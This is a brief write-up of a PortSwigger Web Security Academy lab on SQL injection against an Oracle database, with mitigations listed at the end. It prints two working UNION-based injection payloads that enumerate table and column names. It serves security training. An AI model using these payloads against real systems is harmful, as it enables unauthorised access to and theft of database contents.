# SQL Injection – Database Enumeration (Oracle)

Platform: PortSwigger Web Security Academy  

## Overview

This lab shows how attackers enumerate tables in an Oracle database.

## Exploitation

Payload used:

' UNION SELECT table_name, NULL FROM all_tables--

To find columns:

' UNION SELECT column_name, NULL FROM all_tab_columns 
WHERE table_name='USERS'--

## Result

Database tables and columns are revealed.

## Impact

Attackers can identify sensitive data tables.

## Mitigation

• Prepared statements  
• Input validation
